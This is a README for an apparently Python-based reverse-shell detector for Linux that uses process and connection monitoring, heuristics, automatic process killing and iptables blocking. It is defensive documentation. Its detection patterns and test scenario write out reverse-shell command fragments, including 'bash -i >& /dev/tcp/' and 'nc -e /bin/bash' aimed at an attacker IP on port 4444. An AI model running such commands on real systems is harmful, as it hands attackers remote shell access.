# Reverse-Shell-Detector

🎯 Objective

To detect and neutralise unauthorised remote access sessions on a Linux system. Attackers commonly exploit vulnerabilities to plant a reverse shell payload (e.g., via nc, bash, python, perl, ruby, php or custom malware) that connects back to a command‑and‑control (C2) server. Traditional firewalls often fail to block these connections because they appear as legitimate outbound traffic. This tool monitors system processes and network connections in real time, applies heuristic and rule‑based detection, and automatically kills malicious processes to sever the attacker's foothold.
🧠 How It Works – Technical Overview

The Reverse Shell Detector operates at the intersection of process monitoring and network connection analysis:
1. Process Monitoring (Continuous Scanning)

    Uses psutil to iterate over all running processes on the system at configurable intervals.

    Extracts process metadata: PID, process name, command line arguments, user/owner, parent PID, and CPU/memory usage.

    Compares process names and command‑line arguments against a curated list of suspicious indicators (e.g., nc, netcat, ncat, bash -i, python -c 'import socket...', perl -e 'use Socket...').

2. Network Connection Analysis

    Scans all active network connections (ESTABLISHED, SYN_SENT, CLOSE_WAIT) using psutil.net_connections().

    Extracts: local address/port, remote address/port, connection state, and associated PID.

    Flags connections to suspicious ports (e.g., 4444, 5555, 1337, 31337, 6666, 7777, 8888, 9999) that are commonly used by reverse shell payloads.

    Flags connections to public IP addresses that originate from processes with suspicious names or unusual behaviour (e.g., a bash process initiating an outbound TCP connection).

3. Heuristic & Behavioural Detection

    Parent‑Child Correlation: Detects shells spawned by unusual parent processes (e.g., a web server process like nginx spawning a bash shell is highly suspicious).

    Command‑Line Inspection: Scans process command lines for telltale patterns (e.g., bash -i >& /dev/tcp/, python -c 'socket', perl -e 'exec').

    Timestamp Analysis: Flags processes that started shortly after a known vulnerability exploit attempt (e.g., after a web request to a vulnerable endpoint).

4. Active Response & Remediation

    When a suspicious process is identified, the tool:

        Logs the event to a structured JSON file (timestamp, PID, process name, user, remote IP/port).

        Terminates the process using os.kill(pid, signal.SIGKILL) to immediately break the attacker's connection.

        Optionally blocks the remote IP address using iptables to prevent reconnection attempts.

        Sends an alert via Slack, Telegram, or email to the SOC team.

✨ Advanced Features (Real‑World Upgrade)
Feature	Implementation
Real‑Time Continuous Monitoring	Runs as a persistent daemon, scanning every 5–10 seconds with minimal system overhead, ensuring immediate detection.
Multi‑Vector Detection	Combines process name, command‑line arguments, connection ports, and behavioural heuristics for high accuracy.
Active Termination	Automatically kills suspicious processes using SIGKILL to instantly sever the reverse shell connection.
Firewall Integration	Optionally blocks offending remote IPs at the network layer using iptables or nftables to prevent re‑establishment.
Whitelist Management	Supports custom whitelists (e.g., legitimate bash processes, authorised nc listeners) to reduce false positives in controlled environments.
Forensic Logging	Captures full process details (command line, working directory, environment variables) and network connection metadata for post‑incident investigation.
Alert Deduplication	Prevents repeated alerts for the same process/connection within a configurable time window to avoid alert fatigue.
Integration with Sysmon	Can be extended to read Sysmon logs for even deeper process creation and network event visibility on Windows systems.
🛠️ Tools & Technologies

    Python 3 – core logic for scanning, detection, and response.

    psutil – cross‑platform system monitoring library (processes, network connections, CPU/memory).

    os – for process termination (os.kill).

    subprocess – for executing firewall commands (iptables).

    json – for structured logging.

    signal – for sending termination signals (SIGKILL).

    logging – for local audit trails.

🔬 Testing & Use Case

Scenario:
A system has been compromised via a vulnerable web application, and the attacker has established a reverse shell using nc -e /bin/bash <attacker_IP> 4444. The organisation's traditional firewall allows outbound traffic on port 4444, so the connection is not blocked.

Process:

    The Reverse Shell Detector is running on the compromised host (as a system service).

    Detection:

        The tool scans processes and identifies a nc process with command‑line arguments -e /bin/bash connecting to an external IP on port 4444.

        Rule triggered: Suspicious process name (nc) + Suspicious remote port (4444) = HIGH risk.

    Action:

        The tool logs the event: [ALERT] Suspicious reverse shell detected: PID 12345 | nc -e /bin/bash | Remote 203.0.113.5:4444.

        Terminates the process using os.kill(12345, signal.SIGKILL).

        Executes iptables -A OUTPUT -d 203.0.113.5 -j DROP to block all outbound traffic to the attacker's IP.

        Sends a Slack alert to the security team.

    Result:

        The attacker's shell is instantly killed.

        The attacker cannot reconnect from that IP.

        The SOC team is immediately alerted and can investigate the root cause.

Outcome:

    The compromised system is effectively "disinfected" at the process level within seconds of the attack.

    The security team has a detailed forensic record (command line, user, timestamps) for post‑incident analysis.

    This active response capability provides a critical layer of defence that passive monitoring alone cannot offer.

📁 Output Example (JSON Log)

A typical alert entry contains:

    Timestamp – Date and time of detection.

    PID – Process ID of the suspicious process.

    Process Name – e.g., nc, bash, python3.

    Command Line – Full command‑line arguments (e.g., nc -e /bin/bash 203.0.113.5 4444).

    User – The system account under which the process was running.

    Local Address/Port – The victim's endpoint.

    Remote Address/Port – The attacker's C2 endpoint.

    Detection Reason – e.g., Suspicious process name + suspicious remote port.

    Action Taken – e.g., Process killed, IP blocked.

    Alert Severity – HIGH or CRITICAL.

📝 Conclusion

The Reverse Shell Detector is a powerful, lightweight endpoint security tool that provides real‑time protection against one of the most common attacker post‑exploitation techniques—reverse shells. By combining process monitoring, network analysis, and behavioural heuristics, it achieves a high detection rate while maintaining low false positives. Its active response capability (terminating processes and blocking IPs) ensures that threats are neutralised before they can cause further damage. During testing, it successfully detected and terminated multiple reverse shell variants (nc, python, bash), demonstrating its effectiveness as a critical component of a layered defence strategy. This tool is particularly valuable in environments where full‑fledged EDR solutions are unavailable, providing a cost‑effective alternative for small to medium‑sized organisations.
